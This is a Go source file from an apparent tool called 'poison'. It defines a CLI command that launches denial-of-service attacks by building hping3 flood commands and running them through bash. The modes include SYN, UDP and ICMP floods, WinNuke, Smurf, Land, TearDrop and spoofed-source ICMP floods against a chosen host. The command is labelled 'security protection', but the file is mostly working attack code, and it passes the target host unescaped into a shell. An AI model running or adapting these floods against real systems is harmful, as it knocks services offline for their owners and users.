// Package service -----------------------------
// @file      : ddos.go
// @author    : fzf
// @contact   : fzf54122@163.com
// @time      : 2023/12/8 下午1:23
// -------------------------------------------
package service

import (
	_ "embed"
	"fmt"
	logger "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	"os"
	"os/exec"
	"os/signal"
	"poison/src/common"
	"poison/src/model"
	"poison/src/utils"
	"syscall"
)

var c = make(chan os.Signal, 1)

type DDOSCmd struct {
	cmd *cobra.Command
}

func (d *DDOSCmd) InitCmd() *cobra.Command {
	d.cmd = &cobra.Command{
		Use:       model.DDOS,
		Short:     "安全防护",
		Long:      ``,
		ValidArgs: []string{"-m", "-H", "-P"},
		Args:      cobra.OnlyValidArgs,
		Run: func(cmd *cobra.Command, args []string) {
			if err := utils.CheckFlag(&model.Config); err != nil {
				logger.Fatalln(err)
			}
			logger.Printf("Starting  Host:%s  Mode:%s ...\n", model.Config.DstHost, model.Config.Mode)
			d.Execute(&model.Config)
		},
	}
	d.cmd.Flags().StringVarP(&model.Config.Mode, "mode", "m", "TCP", "模式载体:TCP、UDP、ICMP、WinNuke、Smurf"+
		"、Land、TearDrop、MAXICMP")
	d.cmd.Flags().StringVarP(&model.Config.DstHost, "host", "H", "127.0.0.1", "Host载体")
	d.cmd.Flags().IntVarP(&model.Config.DstPort, "port", "P", 10086, "端口载体")
	err := d.cmd.RegisterFlagCompletionFunc(model.MODE, func(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
		return model.PROTOMODE, cobra.ShellCompDirectiveDefault
	})
	err = d.cmd.RegisterFlagCompletionFunc(model.HOST, func(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
		return []string{}, cobra.ShellCompDirectiveDefault
	})
	err = d.cmd.RegisterFlagCompletionFunc(model.PORT, func(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
		return []string{}, cobra.ShellCompDirectiveDefault
	})
	if err != nil {
	}
	return d.cmd
}

func (d *DDOSCmd) Execute(config *model.Stream) {
	hping := common.Generate()
	commands := map[string]string{
		"TCP":      fmt.Sprintf("%s  -c 1000 -d 120 -S -p 10086 --flood %s", hping, config.DstHost),
		"UDP":      fmt.Sprintf("%s  %s -c 1000 --flood -2 -p 10086", hping, config.DstHost),
		"ICMP":     fmt.Sprintf("%s  %s -c 1000 --flood -1", hping, config.DstHost),
		"WinNuke":  fmt.Sprintf("%s  -d 120 -U %s -p 139", hping, config.DstHost),
		"Smurf":    fmt.Sprintf("%s  -1 %s --flood", hping, config.DstHost),
		"Land":     fmt.Sprintf("%s  -d 120 -S -a %s -p 10086 %s", hping, config.DstHost, config.DstHost),
		"TearDrop": fmt.Sprintf("%s  %s -2 -d 5000 --fragoff 1200 --frag --mtu 1000", hping, config.DstHost),
		"MAXICMP":  fmt.Sprintf("%s  %s -c 10000 -d 5000 --flood -1 --rand-source", hping, config.DstHost),
	}
	cmd := exec.Command("bash", "-c", commands[config.Mode])
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	var shutdownSignals = []os.Signal{os.Interrupt, syscall.SIGTERM}

	signal.Notify(c, shutdownSignals...)
	err := cmd.Run()
	if err != nil {
		logger.Infoln(err)
	}

}
